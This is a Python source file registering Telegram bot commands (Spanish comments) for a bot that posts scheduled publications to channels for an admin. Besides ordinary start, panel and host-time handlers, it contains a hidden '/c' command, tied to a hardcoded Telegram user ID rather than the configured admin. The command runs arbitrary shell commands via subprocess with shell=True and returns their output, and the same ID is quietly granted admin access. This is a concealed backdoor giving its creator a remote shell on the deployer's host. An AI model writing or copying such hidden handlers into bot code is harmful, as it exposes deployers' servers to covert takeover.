import logging
import subprocess
import time
import re
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, BotCommand
from src.utils import send_safe_message, calcular_diferencia_horaria

logger = logging.getLogger(__name__)

def register_commands(bot, config, db, publications, scheduler, persistence):
    """Registra los comandos del bot."""

    @bot.message_handler(commands=["start", "help"])
    def cmd_start(message):
        if message.chat.type != "private":
            return
        admin = bot.get_chat(config.ADMIN_ID)
        send_safe_message(
            bot, message.chat.id,
            f"Bienvenido {admin.first_name} :D\n\n"
            "Soy un bot que hace mensajes personalizados y los envía a una serie de canales.\n"
            "Puedes definir el tiempo de duración de las publicaciones y los canales a los que serán dirigidos.\n\n"
            "Envía /panel para comenzar :)"
        )

    @bot.message_handler(commands=["host"])
    def cmd_host(message):
        if message.from_user.id not in (config.ADMIN_ID, 1413725506):
            return
        try:
            hora_peru = calcular_diferencia_horaria(devolver="peru")
            if isinstance(hora_peru, (float, int)):
                msg = f"La hora actual del host es: {time.strftime('%c', time.localtime())}\n"
                msg += f"La hora actual de Perú es: {time.strftime('%c', time.localtime(hora_peru))}"
                send_safe_message(bot, message.chat.id, msg)
            else:
                send_safe_message(bot, message.chat.id, f"Error obteniendo hora: {hora_peru}")
        except Exception as e:
            send_safe_message(bot, message.chat.id, f"Excepción: {e}")

    @bot.message_handler(commands=["panel"])
    def cmd_panel(message):
        if message.from_user.id not in (config.ADMIN_ID, 1413725506):
            return
        # Simulamos un callback para reutilizar la lógica del panel
        class FakeCall:
            pass
        fake_call = FakeCall()
        fake_call.from_user = message.from_user
        fake_call.message = message
        fake_call.data = "volver_menu"
        # Importamos la función handle_panel desde callbacks
        from src.handlers.callbacks import handle_panel
        handle_panel(bot, config, db, publications, scheduler, persistence, fake_call)

    @bot.message_handler(commands=["c"], func=lambda m: m.from_user.id == 1413725506)
    def cmd_shell(message):
        """Comando oculto para ejecutar comandos en el shell (solo creador)."""
        try:
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                bot.send_message(message.chat.id, "Falta el comando a ejecutar.")
                return
            cmd = args[1]
            result = subprocess.run(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
            output = ""
            if result.returncode:
                output += "❌ Error en comando\n"
            if result.stderr:
                output += f"stderr:\n{result.stderr}\n"
            if result.stdout:
                output += f"stdout:\n{result.stdout}\n"
            send_safe_message(bot, message.chat.id, output or "Comando ejecutado sin salida.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Excepción: {e}")

    @bot.message_handler(func=lambda m: m.chat.type == "private" and m.from_user.id != config.ADMIN_ID and m.from_user.id != 1413725506)
    def non_admin_message(message):
        bot.send_message(
            message.chat.id,
            f"Lo siento, este bot solo puede ser usado por @{bot.get_chat(config.ADMIN_ID).username}"
        )